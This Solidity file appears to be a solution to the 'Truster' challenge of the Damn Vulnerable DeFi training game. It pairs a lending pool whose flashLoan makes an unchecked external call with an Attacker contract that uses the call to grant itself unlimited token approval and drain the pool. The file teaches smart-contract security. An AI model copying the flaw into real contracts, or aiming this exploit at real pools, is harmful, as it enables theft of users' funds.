// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "./DamnValuableToken.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external nonReentrant returns (bool) {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
}

contract Attacker {
    TrusterLenderPool pool;
    DamnValuableToken token;

    constructor(TrusterLenderPool pool_, DamnValuableToken token_) {
        pool = pool_;
        token = token_;
    }

    function attack() public {
        // Request a flashloan that is paid directly to the pool, so no payback
        // is necessary.  Choose token as the target and craft the calldata to
        // call the approve() method, which will be called from the pool,
        // granting us allowance to take the funds.
        pool.flashLoan(
            1 ether,
            address(pool), // to
            address(token), // external call target
            abi.encodeWithSelector( // approve() this address for the max amount
                token.approve.selector,
                address(this),
                type(uint256).max
            )
        );

        // Approval was granted, so take the funds.
        token.transferFrom(address(pool), address(this), 1_000_000 ether);
    }
}
